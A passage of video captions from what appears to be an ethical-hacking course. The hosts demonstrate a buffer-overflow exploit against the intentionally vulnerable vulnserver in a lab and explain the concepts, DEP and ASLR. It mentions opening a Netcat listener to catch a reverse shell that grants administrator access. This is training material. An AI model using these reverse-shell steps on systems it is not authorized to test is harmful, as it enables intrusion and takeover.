down.\n\n51\n00:02:19.337 --> 00:02:21.230\n&gt;&gt; [LAUGH].\n&gt;&gt; Mike's got safety tips for us all.\n\n52\n00:02:21.230 --> 00:02:23.760\nRight?\nHere's our little OSHA meeting.\n\n53\n00:02:23.760 --> 00:02:27.610\nDon't climb up over six feet without\na lanyard and don't attach this to some\n\n54\n00:02:27.610 --> 00:02:31.900\nserver that actually can touch\nthe internet because this is vulnerable by\n\n55\n00:02:31.900 --> 00:02:35.600\ndesign, right, so that you can practice\nthese exploits and things of that nature.\n\n56\n00:02:35.600 --> 00:02:40.510\nSo I'm going to run this as\nan administrator, because most services\n\n57\n00:02:40.510 --> 00:02:44.680\ndo run as some sort of service, or they'll\nhave a service account attached to it.\n\n58\n00:02:44.680 --> 00:02:46.770\nSo this could have been a service account.\n\n59\n00:02:46.770 --> 00:02:50.100\nSome people just fire up services as\nan administrator because that's what\n\n60\n00:02:50.100 --> 00:02:51.360\nthey log in as.\n\n61\n00:02:51.360 --> 00:02:53.900\nThat would be beneficial for\neverybody that wants to do that.\n\n62\n00:02:53.900 --> 00:02:57.520\nSo now, my service is running, you can\nsee it's waiting for a client connection.\n\n63\n00:02:57.520 --> 00:02:59.530\nI am in my little testing lab here.\n\n64\n00:02:59.530 --> 00:03:00.650\nIf I do an ls,\n\n65\n00:03:00.650 --> 00:03:05.950\nI have my little python exploit that I've\nwritten right there, I will run that.\n\n66\n00:03:05.950 --> 00:03:08.390\nActually, I need to do one more thing,\nI need to open a Netcat listener,\n\n67\n00:03:08.390 --> 00:03:13.010\nbecause this is gonna\nreverse shell from that box.\n\n68\n00:03:13.010 --> 00:03:14.520\nSo I'm gonna open up another terminal.\n\n69\n00:03:15.700 --> 00:03:17.660\nI'm gonna bring it down now.\n\n70\n00:03:17.660 --> 00:03:22.700\nI'm just gonna kinda resize it here so\nit will sit in the bottom.\n\n71\n00:03:22.700 --> 00:03:26.530\nAnd now we will run an exploit,\nand it's called sploit.\n\n72\n00:03:26.530 --> 00:03:29.940\nI gotta start my stinking list here.\n\n73\n00:03:29.940 --> 00:03:32.020\n&gt;&gt; I was gonna say,\nyou just throw that out the window.\n\n74\n00:03:32.020 --> 00:03:33.330\n&gt;&gt; Man, I'm so excited to do this, right.\n\n75\n00:03:33.330 --> 00:03:34.380\nI just wanna get to it.\n\n76\n00:03:34.380 --> 00:03:37.080\nRight, so don't forget to start your\nNetCat listener if you're doing a reverse\n\n77\n00:03:37.080 --> 00:03:39.820\nshell, which we are going to do.\n\n78\n00:03:39.820 --> 00:03:42.550\nSo nc-nlv and then whatever port.\n\n79\n00:03:42.550 --> 00:03:45.080\nI actually did use port 5555 on this one.\n\n80\n00:03:45.080 --> 00:03:48.170\nI know in the NetCat\nshow I typically 9999.\n\n81\n00:03:48.170 --> 00:03:51.560\nBut guess what vuln.server is using?\n\n82\n00:03:51.560 --> 00:03:54.160\n9999, right?\nThey love the 9999 as well.\n\n83\n00:03:54.160 --> 00:03:56.170\nI guess great minds think alike.\n\n84\n00:03:56.170 --> 00:03:59.880\nSo, just to keep things\nwhere they need to be,\n\n85\n00:03:59.880 --> 00:04:02.770\ndon't get confused, I used 5555, sorry.\n\n86\n00:04:02.770 --> 00:04:08.250\nCrank that up, I'm now listening, now\nI'm gonna run my exploit, look at that.\n\n87\n00:04:08.250 --> 00:04:09.540\nLook down here.\n\n88\n00:04:09.540 --> 00:04:12.650\nBaddabing, I've changed my prompt,\nthe shell is here.\n\n89\n00:04:12.650 --> 00:04:18.722\nIf I do a who am I,\nit says I am running as Administrator.\n\n90\n00:04:18.722 --> 00:04:20.700\nThat's interesting.\n\n91\n00:04:20.700 --> 00:04:21.940\nI have full control of this box.\n\n92\n00:04:21.940 --> 00:04:25.310\nI can add users do whatever I want right\nnow if I know the proper commands, and\n\n93\n00:04:25.310 --> 00:04:28.700\nif I've gotten this far, I probably have\nthe where-with-all to make that happen.\n\n94\n00:04:28.700 --> 00:04:30.560\nSo that's the end all.\n\n95\n00:04:30.560 --> 00:04:33.160\nActually it's kind of uneventful.\n\n96\n00:04:33.160 --> 00:04:37.150\n&gt;&gt; I was gonna say, that was kind of a let\ndown I mean all you basically did was set\n\n97\n00:04:37.150 --> 00:04:41.880\nup a NetCat listener, push over this,\nrun this script, and you're at a prompt,\n\n98\n00:04:41.880 --> 00:04:46.230\nand we saw you do that yesterday with no\nvulnerabilities, with no buffer overflows.\n\n99\n00:04:46.230 --> 00:04:50.020\nJust by using NetCator any\nof the other ones we use.\n\n100\n00:04:50.020 --> 00:04:51.300\n&gt;&gt; Yeah, totally, right?\n\n101\n00:04:51.300 --> 00:04:56.590\nAnd if you watch the NetCat show or the\nshells and reverse shell show that we did.\n\n102\n00:04:56.590 --> 00:04:59.050\nYou're probably going, yeah,\nthat kinda looks just like that,\n\n103\n00:04:59.050 --> 00:05:00.890\njust like what Mike was talking about.\n\n104\n00:05:00.890 --> 00:05:04.920\n&gt;&gt; But I think the subtle difference\nthat people might not catch on was,\n\n105\n00:05:04.920 --> 00:05:08.290\nyou never logged on at the Windows\nbox to do the other half.\n\n106\n00:05:08.290 --> 00:05:11.330\nIn the episode we did the used NetCat and\nthen see.\n\n107\n00:05:11.330 --> 00:05:14.590\nWe went to one machine, setup a listener,\nwent to the other machine\n\n108\n00:05:14.590 --> 00:05:17.420\nas administrator, logged in and\nintentionally connected.\n\n109\n00:05:17.420 --> 00:05:21.130\n&gt;&gt; In this one,\nall we saw you do was run a service,\n\n110\n00:05:21.130 --> 00:05:24.720\nwhich could be any service that\nnormally runs on that machine.\n\n111\n00:05:24.720 --> 00:05:27.860\nSo nothing is set up on that side\nother than the vulnerable service.\n\n112\n00:05:27.860 --> 00:05:31.210\nAnd then all your NetCat commands were\ndone on the attacker side, right.\n\n113\n00:05:31.210 --> 00:05:32.560\nYou never had to log in and\n\n114\n00:05:32.560 --> 00:05:35.170\ndo anything to establish\na connection from the other side.\n\n115\n00:05:35.170 --> 00:05:36.310\n&gt;&gt; That's exactly right.\n\n116\n00:05:36.310 --> 00:05:40.730\nWell I did, but here's the difference\nbetween what you saw in the previous show\n\n117\n00:05:40.730 --> 00:05:44.603\nversus what you are seeing right now,\nis that server that is running on that\n\n118\n00:05:44.603 --> 00:05:49.180\nWindows machine, put it in your\nmind's eye as this, that's some\n\n119\n00:05:49.180 --> 00:05:53.210\nserver out on the internet that's running\nthis service and it's vulnerable.\n\n120\n00:05:53.210 --> 00:05:56.640\n&gt;&gt; And it's a server that whoever's\nrunning it needs and wants to be running.\n\n121\n00:05:56.640 --> 00:05:58.910\nIt's not like they set it up so\nyou could attack.\n\n122\n00:05:58.910 --> 00:06:02.430\nThey're like, hey we need this web server\nhere's the software I'm gonna use,\n\n123\n00:06:02.430 --> 00:06:03.930\nlet's run it.\n\n124\n00:06:03.930 --> 00:06:05.020\n&gt;&gt; Exactly, that's it.\n\n125\n00:06:05.020 --> 00:06:08.540\nIt's like if anybody was running\na website, or running an FTP server,\n\n126\n00:06:08.540 --> 00:06:10.240\nor running a mail server,\n\n127\n00:06:10.240 --> 00:06:13.070\nall these things are typically\naccessible from the internet.\n\n128\n00:06:13.070 --> 00:06:17.160\nThey don't mean you to be able to gain\nroot access to their machines, they mean\n\n129\n00:06:17.160 --> 00:06:21.750\nto give services to their users of who\nhave a valid account to those machines.\n\n130\n00:06:21.750 --> 00:06:24.390\nIn this instance right here,\nwhat we're looking at right now,\n\n131\n00:06:24.390 --> 00:06:28.510\nI technically do not have a valid account,\nI am not a user of that system.\n\n132\n00:06:28.510 --> 00:06:31.960\nWhat I've done is exploited\na vulnerability in that system,\n\n133\n00:06:31.960 --> 00:06:36.610\nwhich allowed me to execute my own code\nand give me route access to it and\n\n134\n00:06:36.610 --> 00:06:37.640\nshovel the shell to me.\n\n135\n00:06:37.640 --> 00:06:39.900\nI told it, give me shell, right?\n\n136\n00:06:39.900 --> 00:06:41.650\nNormally, that is not what would happen.\n\n137\n00:06:41.650 --> 00:06:43.250\nAnd let's take a look at that.\n\n138\n00:06:43.250 --> 00:06:45.200\nLet's login to that machine.\n\n139\n00:06:45.200 --> 00:06:50.600\nI've probably crashed it by now\nbecause I'm, well, I'm yeah.\n\n140\n00:06:50.600 --> 00:06:51.370\nThe vulnerability does that.\n\n141\n00:06:51.370 --> 00:06:52.640\nIt's just not running anymore.\n\n142\n00:06:52.640 --> 00:06:54.040\nSo let's restart the service.\n\n143\n00:06:55.880 --> 00:06:57.550\nAnd let's actually log into it,\n\n144\n00:06:57.550 --> 00:07:00.710\nand see what it normally\nwould like to a normal user.\n\n145\n00:07:00.710 --> 00:07:04.293\nIf I, I could use my good old nc for that.\n\n146\n00:07:04.293 --> 00:07:08.288\nnv to, it is 192.168.2.19.200i.\n\n147\n00:07:08.288 --> 00:07:12.451\nI set a static IP for this one just so\n\n148\n00:07:12.451 --> 00:07:16.510\nwe don't get confused here.\n\n149\n00:07:16.510 --> 00:07:18.580\nAnd then it's running on port 9999.\n\n150\n00:07:18.580 --> 00:07:22.100\nSo now I've logged into vuln.server,\nI can enter help for help, so\n\n151\n00:07:22.100 --> 00:07:25.385\nI can say help like that and\nit gives me a list of commands.\n\n152\n00:07:25.385 --> 00:07:26.543\nThis is typically it.\n\n153\n00:07:26.543 --> 00:07:29.965\nIf I logged into a mail server\nit has a list of commands.\n\n154\n00:07:29.965 --> 00:07:32.465\nAnd if I know the system I\ncan use the commands and\n\n155\n00:07:32.465 --> 00:07:35.005\nperform actions that\nthe service allows for me.\n\n156\n00:07:35.005 --> 00:07:38.215\nSame idea here,\nthis one is just designed purposefully for\n\n157\n00:07:38.215 --> 00:07:39.795\nyou to learn buffer overflow.\n\n158\n00:07:39.795 --> 00:07:41.905\nSo I will show you.\n\n159\n00:07:41.905 --> 00:07:45.835\nLike I said, you can just go onto\nGoogle and type in vuln.server, and\n\n160\n00:07:45.835 --> 00:07:47.705\nyou'll be able to find\nthe download link for this.\n\n161\n00:07:47.705 --> 00:07:48.885\nIt's pretty simple to find.\n\n162\n00:07:49.940 --> 00:07:52.950\nBut that's it, and then I can do exit.\n\n163\n00:07:52.950 --> 00:07:54.998\nAnd it will shut down.\n\n164\n00:07:54.998 --> 00:07:57.018\nThat's how it's designed to run.\n\n165\n00:07:57.018 --> 00:08:01.273\nWe're going to, we made it run in a way\nit wasn't designed to do which was Give\n\n166\n00:08:01.273 --> 00:08:04.090\nme shell access with\nadministrative privileges or\n\n167\n00:08:04.090 --> 00:08:07.380\nprivileges of whatever user is\nrunning it to that machine.\n\n168\n00:08:07.380 --> 00:08:10.754\nNot designed to do, well see it\nis designed to do that, but most\n\n169\n00:08:10.754 --> 00:08:15.488\nservices aren't even though some services\nhave a vulnerability to buffer overflows.\n\n170\n00:08:15.488 --> 00:08:19.530\nAnd that's what we use to be able to do\nthat very thing was a buffer overflow.\n\n171\n00:08:19.530 --> 00:08:21.079\nIt was susceptible to that.\n\n172\n00:08:21.079 --> 00:08:22.357\n&gt;&gt; All right Daniel, so\n\n173\n00:08:22.357 --> 00:08:26.970\nlet's talk then a little bit about\nwhat a buffer overflow actually is.\n\n174\n00:08:26.970 --> 00:08:28.264\n&gt;&gt; Yeah, good place to start, right?\n\n175\n00:08:28.264 --> 00:08:29.728\nCuz now you're like,\nokay this buffer overflow thing-\n\n176\n00:08:29.728 --> 00:08:30.781\n&gt;&gt; Which two it does.\n\n177\n00:08:30.781 --> 00:08:31.900\n&gt;&gt; It seems interesting.\n\n178\n00:08:31.900 --> 00:08:32.410\nTell me more.\n\n179\n00:08:32.410 --> 00:08:33.395\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] Yeah,\n\n180\n00:08:33.395 --> 00:08:34.438\nthat's what we're gonna do.\n\n181\n00:08:34.438 --> 00:08:36.340\nSo what is a buffer overflow?\n\n182\n00:08:36.340 --> 00:08:37.360\nSo when you load a program,\n\n183\n00:08:37.360 --> 00:08:41.290\nwhen you start a program,\nif you're any aware of computers,\n\n184\n00:08:41.290 --> 00:08:43.580\nyou've been working in technology,\nyou know a little bit about that.\n\n185\n00:08:43.580 --> 00:08:45.760\nAnd that's really all you need to know,\n\n186\n00:08:45.760 --> 00:08:48.580\nmaybe a little bit more\non how programs work.\n\n187\n00:08:48.580 --> 00:08:51.580\nThe executable fires off,\nit loads into memory.\n\n188\n00:08:51.580 --> 00:08:54.100\nMemory stores it there so\nthat you can run it.\n\n189\n00:08:54.100 --> 00:08:55.650\nIt has a set of instructions.\n\n190\n00:08:55.650 --> 00:08:57.160\nIt has a set of options.\n\n191\n00:08:57.160 --> 00:09:01.660\nMaybe you could input data and\nit can output data, things of that nature.\n\n192\n00:09:01.660 --> 00:09:05.972\nAnd, what happens is, is when you're\nable to input data into a system,\n\n193\n00:09:05.972 --> 00:09:10.340\nyou gotta remember, that's loaded\nup into the memory of the system.\n\n194\n00:09:10.340 --> 00:09:14.980\nIf I'm able to throw so much data at\nit that it doesn't know what to do,\n\n195\n00:09:16.460 --> 00:09:18.760\nthen we might get the program to crash,\nright?\n\n196\n00:09:18.760 --> 00:09:22.260\nBecause if it doesn't know what to do,\nit says, I don't know what to do, and\n\n197\n00:09:22.260 --> 00:09:23.322\nstops working.\n\n198\n00:09:23.322 --> 00:09:26.790\nIf there's nothing in there to say, if you\nfound something and you don't know what to\n\n199\n00:09:26.790 --> 00:09:29.460\ndo then do this, well then\ntechnically it does know what to do.\n\n200\n00:09:29.460 --> 00:09:32.160\nDo that thing that you\nbecause something's happening\n\n201\n00:09:32.160 --> 00:09:33.658\nthat you're not supposed to be aware of.\n\n202\n00:09:33.658 --> 00:09:35.610\nSo, we're gonna exploit that.\n\n203\n00:09:35.610 --> 00:09:36.459\nThat's what's happening.\n\n204\n00:09:36.459 --> 00:09:40.601\nBuffer overflows is basically taking that,\nwe're gonna cram data at it so\n\n205\n00:09:40.601 --> 00:09:44.740\nthat it doesn't know what to do with it,\nand that's part of the equation,\n\n206\n00:09:44.740 --> 00:09:48.882\nto be susceptible it has to make sure\nthat what's called bounds checking is\n\n207\n00:09:48.882 --> 00:09:50.185\nnot enabled, right?\n\n208\n00:09:50.185 --> 00:09:54.260\nThat protections aren't put into place to\nkeep these kind of things from happening.\n\n209\n00:09:54.260 --> 00:09:56.980\nSo just because we know how to\n\n210\n00:09:56.980 --> 00:10:00.800\nfind maybe a susceptible doesn't\nmean it's going to happen, okay?\n\n211\n00:10:00.800 --> 00:10:02.480\nJust keep that in mind.\n\n212\n00:10:02.480 --> 00:10:04.970\nYou can't just go grab a random\nprogram and go well it takes input,\n\n213\n00:10:04.970 --> 00:10:07.630\nI'm just gonna cram input\nat it until it crashes.\n\n214\n00:10:07.630 --> 00:10:08.660\nIt might not crash.\n\n215\n00:10:08.660 --> 00:10:11.300\nAnd even if it does crash, it doesn't\nnecessarily mean you're going to get to\n\n216\n00:10:11.300 --> 00:10:14.600\nbuffer overflow land and get that\nreverse shell that we were looking for.\n\n217\n00:10:14.600 --> 00:10:18.830\nSo just keep that in mind when we're\ntalking about practicality, real life.\n\n218\n00:10:18.830 --> 00:10:21.380\nThis is designed to do it so\nthat I can actually show you that,\n\n219\n00:10:21.380 --> 00:10:24.415\ncuz otherwise this show's\ngoing no where real fast.\n\n220\n00:10:24.415 --> 00:10:27.488\n[LAUGH] So\njust I want to keep that in the mind.\n\n221\n00:10:27.488 --> 00:10:31.646\n&gt;&gt; So, I guess, and just to rephrase to\nmake sure I understand what you're saying,\n\n222\n00:10:31.646 --> 00:10:35.410\nan application is typically\nassigned memory when it starts up.\n\n223\n00:10:35.410 --> 00:10:38.370\nAnd that assignment is saying\nyou get from here to here.\n\n224\n00:10:38.370 --> 00:10:42.160\nYou get this much, for round numbers\nlet's say you get one megabyte of memory.\n\n225\n00:10:42.160 --> 00:10:45.780\nSo that's the application's memory where\nit can do whatever it needs, calculations,\n\n226\n00:10:45.780 --> 00:10:48.290\nstoring data from user input or whatever.\n\n227\n00:10:48.290 --> 00:10:52.360\nA buffer overflow is when\nwe try to put more data,\n\n228\n00:10:52.360 --> 00:10:55.260\ngive that program more data\nthan it has room to store.\n\n229\n00:10:55.260 --> 00:10:58.930\nAnd then if the application doesn't\nhave rules in place that say, hey look,\n\n230\n00:10:58.930 --> 00:11:01.460\nI'm getting close to my max,\nI'm gonna stop taking input.\n\n231\n00:11:01.460 --> 00:11:03.460\nIf it continues to take the input but\n\n232\n00:11:03.460 --> 00:11:07.790\nhas nowhere to put it,\nthat's when we overflow the buffer.\n\n233\n00:11:07.790 --> 00:11:11.240\n&gt;&gt; That's right, and we're gonna see\nthese things called registers, and\n\n234\n00:11:11.240 --> 00:11:15.270\nthis is where they, kinda,\nhold temporary data for purposes of use.\n\n235\n00:11:15.270 --> 00:11:20.160\nAnd guess what, you can, whatever\nthat data is, it's going to use it.\n\n236\n00:11:20.160 --> 00:11:23.980\nSo, if that data is our arbitrary code\nthat we've pushed in, see that's what\n\n237\n00:11:23.980 --> 00:11:29.420\nhappens is we're gonna basically override\nthe data that's supposed to go in there.\n\n238\n00:11:29.420 --> 00:11:33.090\nI can take a certain amount of input,\nbut if you give me too much,\n\n239\n00:11:33.090 --> 00:11:35.330\nwell I'm just gonna start to\ntry to put it wherever I can.\n\n240\n00:11:35.330 --> 00:11:37.320\nWell, I'll put it here,\nand I'll put it there.\n\n241\n00:11:37.320 --> 00:11:40.020\nAnd we're pushing out what\nnormally would go there.\n\n242\n00:11:40.020 --> 00:11:43.290\nAnd we're overriding it,\nhence the overflow, all right?\n\n243\n00:11:43.290 --> 00:11:45.710\nSo that's basically what's happening here.\n\n244\n00:11:45.710 --> 00:11:47.050\nHopefully that makes sense.\n\n245\n00:11:47.050 --> 00:11:51.107\nIt'll probably make a whole lot more sense\nas we start really diving into this and\n\n246\n00:11:51.107 --> 00:11:52.610\nwe're looking at that data.\n\n247\n00:11:52.610 --> 00:11:55.030\nAnd you're gonna go that's\nwhat he's talking about.\n\n248\n00:11:55.030 --> 00:11:56.475\nOkay, that makes sense.\n\n249\n00:11:56.475 --> 00:11:59.330\nBecause talking about it is one thing,\nseeing it and\n\n250\n00:11:59.330 --> 00:12:01.650\ndoing it is a complete different story.\n\n251\n00:12:01.650 --> 00:12:05.460\nAnd it does make a whole lot more sense\nas we actually perform these acts.\n\n252\n00:12:05.460 --> 00:12:07.960\nSo, let's see here,\nwhat do I wanna talk about?\n\n253\n00:12:07.960 --> 00:12:10.425\nMake sure I didn't miss anything,\ngo over my notes really quickly.\n\n254\n00:12:10.425 --> 00:12:13.552\nMalicious code spilling in a member\nspace that will run itself.\n\n255\n00:12:13.552 --> 00:12:14.764\nWhat causes a buffer overflow.\n\n256\n00:12:14.764 --> 00:12:18.680\nRemember that is improper\nhandling of inputs.\n\n257\n00:12:18.680 --> 00:12:22.220\nSo we're gonna throw everything and the\nkitchen sink at it and see what it does.\n\n258\n00:12:22.220 --> 00:12:26.330\nAgain, hacker mindset, I know what it's\nsupposed to do, what can I make it do?\n\n259\n00:12:26.330 --> 00:12:28.877\nAnd if crashing is something\nI can make it do, well then,\n\n260\n00:12:28.877 --> 00:12:31.280\nI've learned something about this system,\nright?\n\n261\n00:12:31.280 --> 00:12:36.355\nIf I want it to crash, I can do x,\ncuz I learned I can do that.\n\n262\n00:12:36.355 --> 00:12:39.270\nLet's do talk about some guards\nagainst buffer overflow because they\n\n263\n00:12:39.270 --> 00:12:40.590\nare important.\n\n264\n00:12:40.590 --> 00:12:45.110\nJust a couple of them\nthat I want to speak of.\n\n265\n00:12:45.110 --> 00:12:49.110\nOne is them called\nData Execution Protection or DEP.\n\n266\n00:12:49.110 --> 00:12:52.158\nAs I am horrible, I remember the acronym\nbut I never remember what they stand for,\n\n267\n00:12:52.158 --> 00:12:53.276\nso I am reading my sheet here.\n\n268\n00:12:53.276 --> 00:12:58.524\nData Execution Protection, and what it\ndoes is it double checks the memory\n\n269\n00:12:58.524 --> 00:13:04.280\nto make sure that what is supposed to\nbe in there is exactly what's in there.\n\n270\n00:13:04.280 --> 00:13:05.910\nSo you load the program into memories.\n\n271\n00:13:05.910 --> 00:13:07.390\nIt kind of takes a snapshot.\n\n272\n00:13:07.390 --> 00:13:08.398\nThis is what it looks like.\n\n273\n00:13:08.398 --> 00:13:10.189\nThis is how it's supposed to operate.\n\n274\n00:13:10.189 --> 00:13:14.768\nThen when you go to run or execute\nsome instruction to that program well,\n\n275\n00:13:14.768 --> 00:13:17.140\nit may be some malicious code.\n\n276\n00:13:17.140 --> 00:13:19.500\nIt compares it and says, well,\nthis is what it's supposed to like and\n\n277\n00:13:19.500 --> 00:13:21.160\nwhat the heck is this?\n\n278\n00:13:21.160 --> 00:13:22.530\nThat's not right.\n\n279\n00:13:22.530 --> 00:13:24.940\nThat's not,\nit's supposed to look like this.\n\n280\n00:13:24.940 --> 00:13:26.160\nEh eh wrong you're not doing it.\n\n281\n00:13:26.160 --> 00:13:31.135\nSo, this can cause our buffer overflows to\nnot work even if we might be able to get\n\n282\n00:13:31.135 --> 00:13:34.344\nthat far,\nthe DEP might stop us in our rough level.\n\n283\n00:13:34.344 --> 00:13:35.290\nThis is good coding.\n\n284\n00:13:35.290 --> 00:13:37.100\nIf you're a coder and\n\n285\n00:13:37.100 --> 00:13:41.120\nyou're keeping security in mind you're\nimplementing these types of features.\n\n286\n00:13:41.120 --> 00:13:48.950\nThe other one is Address Space\nLayout Randomization or ASLR.\n\n287\n00:13:48.950 --> 00:13:52.728\nAnd this is a sneaky little thing.\n\n288\n00:13:52.728 --> 00:13:54.094\n&gt;&gt; [LAUGH] It is.\n&gt;&gt; There are smart people\n\n289\n00:13:54.094 --> 00:13:55.599\nthat come up with these protections.\n\n290\n00:13:55.599 --> 00:13:56.831\n&gt;&gt; They make it so hard.\n\n291\n00:13:56.831 --> 00:13:59.088\n&gt;&gt; Yeah, that's kind of the point.\n\n292\n00:13:59.088 --> 00:14:00.690\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n293\n00:14:00.690 --> 00:14:01.548\n&gt;&gt; They wanna make it so\n\n294\n00:14:01.548 --> 00:14:03.874\nhard you just say,\nI'm not doing this, forget this.\n\n295\n00:14:03.874 --> 00:14:05.660\nI'm gonna go be a truck driver or\nsomething.\n\n296\n00:14:05.660 --> 00:14:07.935\nYou know no offense,\nmy dad was a truck driver.\n\n297\n00:14:07.935 --> 00:14:09.999\n[LAUGH] That's a great job\nto be honest with you.\n\n298\n00:14:09.999 --> 00:14:12.277\nWell, what does ASLR do?\n\n299\n00:14:12.277 --> 00:14:14.213\nWhat ASLR does is it says,\n\n300\n00:14:14.213 --> 00:14:18.630\nwhen I load a program into memory\nI assign it a memory space.\n\n301\n00:14:18.630 --> 00:14:20.573\nAnd here you go,\nthat's where your function goes.\n\n302\n00:14:20.573 --> 00:14:23.596\nThat's where this function goes,\nthis instruction check gets this memory\n\n303\n00:14:23.596 --> 00:14:25.590\nallocation, and\nthat's where these things go.\n\n304\n00:14:27.300 --> 00:14:30.232\nIf I can predict that because it\ndoes the same place every time,\n\n305\n00:14:30.232 --> 00:14:33.080\nevery time I load that program up,\nit says, okay, this goes here and\n\n306\n00:14:33.080 --> 00:14:35.980\nthis goes here and this goes here,\nand it does that way every time.\n\n307\n00:14:35.980 --> 00:14:37.150\nThat's good for me as the hacker.\n\n308\n00:14:37.150 --> 00:14:41.900\nIt's good for me as the pen tester,\nbecause I can predict those values.\n\n309\n00:14:41.900 --> 00:14:45.700\nThat makes it easy for me to find those\nvalues cuz I know where they are.\n\n310\n00:14:45.700 --> 00:14:47.360\nAnd they're in the same spot every time.\n\n311\n00:14:47.360 --> 00:14:48.682\nUse that to my advantage.\n\n312\n00:14:48.682 --> 00:14:53.000\nWhat ASLR does is says, we're not gonna\nput them in the same spot every time.\n\n313\n00:14:53.000 --> 00:14:55.820\nWe're gonna just continually\nshift the board around.\n\n314\n00:14:55.820 --> 00:14:58.280\nAnd every time we load this up\nit's gonna go over here and\n\n315\n00:14:58.280 --> 00:15:00.700\nmaybe it was here last time but\nit's going over here now.\n\n316\n00:15:00.700 --> 00:15:02.480\nSo these protections might be in place and\n\n317\n00:15:02.480 --> 00:15:07.630\nthese will stop you from successfully\nexploiting a buffer overflow.\n\n318\n00:15:07.630 --> 00:15:11.290\nOkay, let's talk about methodology.\n\n319\n00:15:11.290 --> 00:15:14.236\nHow do we start our buffer overflow?\n\n320\n00:15:14.236 --> 00:15:19.900\nWhat's the A to B or\nA to Z make a buffer overflow work.\n\n321\n00:15:19.900 --> 00:15:21.140\nAnd this is an important part.\n\n322\n00:15:21.140 --> 00:15:23.200\nYou have to have a set method.\n\n323\n00:15:23.200 --> 00:15:27.400\nAnd it is tricky,\nit is twisty, take good notes.\n\n324\n00:15:27.400 --> 00:15:30.900\nBecause you could follow me along,\ntype exactly what I type and\n\n325\n00:15:30.900 --> 00:15:32.550\nyou'll probably get it work.\n\n326\n00:15:32.550 --> 00:15:34.960\nBut then you'll go to do it yourself,\n\n327\n00:15:34.960 --> 00:15:38.540\ntry to recreate that and\nyou're like aw, why did I write this?\n\n328\n00:15:38.540 --> 00:15:40.035\nI don't understand what I'm doing here.\n\n329\n00:15:40.035 --> 00:15:41.788\n&gt;&gt; [LAUGH]\n&gt;&gt; Trust me, been there.\n\n330\n00:15:41.788 --> 00:15:44.350\n&gt;&gt; I was gonna say, sounds like\nyou're speaking from experience.\n\n331\n00:15:44.350 --> 00:15:45.840\n&gt;&gt; Yeah,\nyeah I don't know anything about it.\n\n332\n00:15:45.840 --> 00:15:47.980\nEvery time I've done this it\nworked perfectly, ever time.\n\n333\n00:15:47.980 --> 00:15:49.088\nNever have an issue.\n\n334\n00:15:49.088 --> 00:15:51.349\nRemember we're working with code.\n\n335\n00:15:51.349 --> 00:15:56.479\nWe're working with assembly language even,\nso.\n\n336\n00:15:56.479 --> 00:15:59.707\nBe prepared for some things to\nreally twist your mind around.\n\n337\n00:15:59.707 --> 00:16:02.410\nEspecially the way they do things.\n\n338\n00:16:02.410 --> 00:16:03.888\nI'll just throw this out here.\n\n339\n00:16:03.888 --> 00:16:06.935\nLittle Indian, love it,\nit's a fantastic thing.\n\n340\n00:16:06.935 --> 00:16:08.687\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't know why it's that way, but\n\n341\n00:16:08.687 --> 00:16:11.740\nit sure is a thing, and you're gonna\nlearn about it here in just a few.\n\n342\n00:16:11.740 --> 00:16:14.492\nSo keep that in mind,\nsome weird stuff that's going on.\n\n343\n00:16:14.492 --> 00:16:18.790\nAll right, so first thing you need\nto do is create a test environment.\n\n344\n00:16:18.790 --> 00:16:22.563\nYes, as pen testers we\nneed test environments.\n\n345\n00:16:22.563 --> 00:16:26.422\nBecause people aren't gonna just go hey,\nyeah, hack away at my system until you\n\n346\n00:16:26.422 --> 00:16:29.320\nfigure out how to break it and\nthen we're here for you.\n\n347\n00:16:29.320 --> 00:16:30.511\nThat's not gonna occur.\n\n348\n00:16:30.511 --> 00:16:32.294\n&gt;&gt; Or as a bad guy, as an attacker,\n\n349\n00:16:32.294 --> 00:16:36.264\nyou wanna protect your method before\nyou actually launch your attack.\n\n350\n00:16:36.264 --> 00:16:40.010\nAnd that set off all the alarms as\nyou're figuring out what to do.\n\n351\n00:16:40.010 --> 00:16:43.490\n&gt;&gt; Yeah, you start throwing exploit\ncode at random at people's machines.\n\n352\n00:16:43.490 --> 00:16:46.624\nIf any kind of IDS, IPS is involved,\nthey might pick that up and\n\n353\n00:16:46.624 --> 00:16:49.123\nthen you get to wear a shiny\nnew pair of bracelets.\n\n354\n00:16:49.123 --> 00:16:53.082\n&gt;&gt; [LAUGH]\n&gt;&gt; And stay a night in the county hotel or\n\n355\n00:16:53.082 --> 00:16:54.649\nmaybe a few nights.\n\n356\n00:16:54.649 --> 00:16:57.088\nSo, and a good spot for\nus to put our disclaimer.\n\n357\n00:16:57.088 --> 00:17:02.560\nDo not do these things on machines that\nyou do not have authorization to or own.\n\n358\n00:17:02.560 --> 00:17:03.670\nRight?\nSo this is not for\n\n359\n00:17:03.670 --> 00:17:06.610\nyou to just make the Internet\nyour play thing.\n\n360\n00:17:06.610 --> 00:17:12.029\nThis is for ethical people to do ethical\nthings, to find problems in code so\n\n361\n00:17:12.029 --> 00:17:17.462\nthat you can help them fix it, not\nexploit it to your fun and profit, okay?\n\n362\n00:17:17.462 --> 00:17:19.674\nDisclaimer over, there it is,\na random aside for,\n\n363\n00:17:19.674 --> 00:17:22.200\nyou do not do bad things with\nwhat we're teaching you to do.\n\n364\n00:17:22.200 --> 00:17:23.362\n&gt;&gt; All right, now let's have some fun.\n\n365\n00:17:23.362 --> 00:17:24.520\n&gt;&gt; Yeah, let's have some fun.\n\n366\n00:17:24.520 --> 00:17:27.170\nSo let's talk about creating\nthe test environment.\n\n367\n00:17:27.170 --> 00:17:31.511\nThis is, this program specifically runs on\nWindows so I need a Windows environment.\n\n368\n00:17:31.511 --> 00:17:35.680\nI will now sit here and wait until you\ninstall Windows VM or a Windows machine.\n\n369\n00:17:35.680 --> 00:17:36.566\nAnd, [LAUGH] no i won't wait.\n\n370\n00:17:36.566 --> 00:17:39.953\nAnd now that that's done, right?\n\n371\n00:17:39.953 --> 00:17:40.517\n[LAUGH] That's right.\n\n372\n00:17:40.517 --> 00:17:41.620\n&gt;&gt; Go and grab the vulnserver.\n\n373\n00:17:41.620 --> 00:17:44.820\nRight, you need a copy of whatever\nit is that you're testing.\n\n374\n00:17:44.820 --> 00:17:48.580\nThis is an FTP server, so\nit's a VSFTP on Linux.\n\n375\n00:17:48.580 --> 00:17:53.784\nInstall the same Linux environment\nwith the same copy of VSFTP and\n\n376\n00:17:53.784 --> 00:17:55.401\nput that together.\n\n377\n00:17:55.401 --> 00:17:58.770\nYou can't mix and match 